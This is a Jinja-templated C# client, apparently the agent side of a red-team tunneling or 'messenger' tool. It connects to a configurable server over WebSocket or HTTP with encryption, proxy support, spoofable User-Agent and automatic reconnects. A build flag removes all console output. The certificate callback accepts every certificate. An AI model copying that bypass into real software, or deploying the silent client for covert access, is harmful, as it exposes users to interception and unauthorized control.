using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;

namespace ServiceClient
{
    public class Program
    {
        private const string SERVER_URL = "{{ server_url }}";
        private const string ENCRYPTION_KEY = "{{ encryption_key }}";
        private const string USER_AGENT = "{{ user_agent }}";
        private const string PROXY = "{{ proxy }}";
        private const double RETRY_DURATION = {{ retry_duration }};
        private const int RETRY_ATTEMPTS = {{ retry_attempts }};

{% if not no_arg_parsing %}
        private static void PrintHelp()
        {
            {% if not no_print %}
            Console.WriteLine("Usage: ServiceClient [options]");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.WriteLine("  --server-url <url>         Server URL to connect to");
            Console.WriteLine("  -e, --encryption-key <key> AES encryption key");
            Console.WriteLine("  --user-agent <ua>          Custom User-Agent string");
            Console.WriteLine("  --proxy <url>              Proxy URL");
            Console.WriteLine("  --retry-duration <secs>    Total time to retry connecting");
            Console.WriteLine("  --retry-attempts <n>       Number of retry attempts");
            Console.WriteLine("  -h, --help                 Show this help message");
            {% endif %}
        }

        private static Dictionary<string, string> ParseArgs(string[] args)
        {
            var parsed = new Dictionary<string, string>();
            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "-h":
                    case "--help":
                        PrintHelp();
                        Environment.Exit(0);
                        break;
                    case "--server-url":
                    case "-e":
                    case "--encryption-key":
                    case "--user-agent":
                    case "--proxy":
                    case "--retry-duration":
                    case "--retry-attempts":
                        if (i + 1 >= args.Length)
                        {
                            {% if not no_print %}
                            Console.WriteLine($"[!] {args[i]} requires a value.");
                            {% endif %}
                            break;
                        }
                        var key = args[i].StartsWith("--") ? args[i].Substring(2) : "encryption-key";
                        parsed[key] = args[++i];
                        break;
                    default:
                        {% if not no_print %}
                        Console.WriteLine($"[!] Could not find argument `{args[i]}`.");
                        {% endif %}
                        break;
                }
            }
            return parsed;
        }
{% endif %}

        public static async Task Main(string[] args)
        {
            ServicePointManager.ServerCertificateValidationCallback =
                new RemoteCertificateValidationCallback(ValidateServerCertificate);

{% if not no_arg_parsing %}
            var parsed = ParseArgs(args);

            string serverUrl = parsed.ContainsKey("server-url") && !string.IsNullOrEmpty(parsed["server-url"]) ? parsed["server-url"] : SERVER_URL;
            string encryptionKeyStr = parsed.ContainsKey("encryption-key") && !string.IsNullOrEmpty(parsed["encryption-key"]) ? parsed["encryption-key"] : ENCRYPTION_KEY;
            if (string.IsNullOrEmpty(encryptionKeyStr))
            {
                {% if not no_print %}
                Console.WriteLine("[!] No encryption key provided, please specify one with --encryption-key.");
                {% endif %}
                return;
            }
            byte[] encryptionKey = Crypto.Hash(encryptionKeyStr);
            string userAgent = parsed.ContainsKey("user-agent") && !string.IsNullOrEmpty(parsed["user-agent"]) ? parsed["user-agent"] : USER_AGENT;
            string proxyStr = parsed.ContainsKey("proxy") && !string.IsNullOrEmpty(parsed["proxy"]) ? parsed["proxy"] : PROXY;
            double retryDuration = parsed.ContainsKey("retry-duration") ? double.Parse(parsed["retry-duration"]) : RETRY_DURATION;
            int retryAttempts = parsed.ContainsKey("retry-attempts") ? int.Parse(parsed["retry-attempts"]) : RETRY_ATTEMPTS;
{% else %}
            string serverUrl = SERVER_URL;
            byte[] encryptionKey = Crypto.Hash(ENCRYPTION_KEY);
            string userAgent = USER_AGENT;
            string proxyStr = PROXY;
            double retryDuration = RETRY_DURATION;
            int retryAttempts = RETRY_ATTEMPTS;
{% endif %}

            IWebProxy proxy = null;
            if (!string.IsNullOrEmpty(proxyStr))
            {
                proxy = CreateWebProxy(proxyStr);
                {% if not no_print %}
                Console.WriteLine($"[*] Using proxy: {proxyStr}");
                {% endif %}
            }

            string uri = serverUrl.Trim('/');
            string[] schemes;

            if (uri.Contains("://"))
            {
                string[] urlParts = uri.Split(new[] { "://" }, 2, StringSplitOptions.None);
                schemes = urlParts[0].Split('+');
                uri = urlParts[1];
            }
            else
            {
                schemes = new[] { "ws", "wss", "http", "https" };
            }

            ServiceClient client = null;

            for (int i = 0; i < schemes.Length; i++)
            {
                string scheme = schemes[i];
                string candidateUrl = $"{scheme}://{uri}";

                if (scheme.Contains("ws"))
                {
                    client = new WsServiceClient(candidateUrl, encryptionKey, userAgent, proxy);
                }
                else if (scheme.Contains("http"))
                {
                    client = new HttpServiceClient(candidateUrl, encryptionKey, userAgent, proxy);
                }
                else
                {
                    {% if not no_print %}
                    Console.WriteLine($"[!] Unsupported scheme: {scheme}");
                    {% endif %}
                    continue;
                }

                {% if not no_print %}
                Console.WriteLine($"[*] Attempting to connect over {scheme.ToUpper()} to {candidateUrl} ({i + 1}/{schemes.Length})");
                {% endif %}
                try
                {
                    await client.ConnectAsync();
                    {% if not no_print %}
                    Console.WriteLine($"[+] Connected to {candidateUrl}");
                    {% endif %}
                    break;
                }
                catch (DecryptionException)
                {
                    {% if not no_print %}
                    Console.WriteLine("[!] Decryption failed -- the encryption key is likely incorrect. The messenger cannot decrypt server traffic and is stopping.");
                    {% endif %}
                    return;
                }
                catch (Exception ex)
                {
                    {% if not no_print %}
                    Console.WriteLine($"[!] Connection failed: {ex.Message}");
                    {% endif %}
                    client.CloseTransport();
                    client = null;
                    continue;
                }
            }

            if (client == null)
            {
                {% if not no_print %}
                Console.WriteLine("[!] All connection attempts failed.");
                {% endif %}
                return;
            }

            try
            {
                try
                {
                    await client.StartAsync();
                }
                catch (DecryptionException)
                {
                    {% if not no_print %}
                    Console.WriteLine("[!] Decryption failed -- the encryption key is likely incorrect. The messenger cannot decrypt server traffic and is stopping.");
                    {% endif %}
                    return;
                }
                catch (Exception ex)
                {
                    {% if not no_print %}
                    Console.WriteLine($"[!] Disconnected: {ex.Message}");
                    {% endif %}
                }

                if (client.Killed)
                    return;

                if (retryAttempts <= 0)
                    return;

                int sleepInterval = (int)((retryDuration / retryAttempts) * 1000);
                int consecutiveFailures = 0;

                while (consecutiveFailures < retryAttempts)
                {
                    consecutiveFailures++;
                    {% if not no_print %}
                    Console.WriteLine($"[*] Attempting to reconnect ({consecutiveFailures}/{retryAttempts})");
                    {% endif %}
                    await Task.Delay(sleepInterval);

                    try
                    {
                        await client.ConnectAsync();
                        if (client.Killed)
                            break;
                        {% if not no_print %}
                        Console.WriteLine("[+] Reconnected");
                        {% endif %}
                        consecutiveFailures = 0;
                        await client.StartAsync();
                    }
                    catch (DecryptionException)
                    {
                        {% if not no_print %}
                        Console.WriteLine("[!] Decryption failed -- the encryption key is likely incorrect. The messenger cannot decrypt server traffic and is stopping.");
                        {% endif %}
                        return;
                    }
                    catch (Exception ex)
                    {
                        {% if not no_print %}
                        Console.WriteLine($"[!] Reconnection failed: {ex.Message}");
                        {% endif %}
                    }

                    if (client.Killed)
                        break;
                }
            }
            finally
            {
                client.Cleanup();
            }
        }

        private static IWebProxy CreateWebProxy(string proxyConfig)
        {
            var proxyUri = new Uri(proxyConfig);
            var webProxy = new WebProxy(proxyUri);

            if (!string.IsNullOrEmpty(proxyUri.UserInfo))
            {
                string[] userInfo = proxyUri.UserInfo.Split(':');
                if (userInfo.Length == 2)
                    webProxy.Credentials = new NetworkCredential(userInfo[0], userInfo[1]);
            }

            return webProxy;
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
    }
}
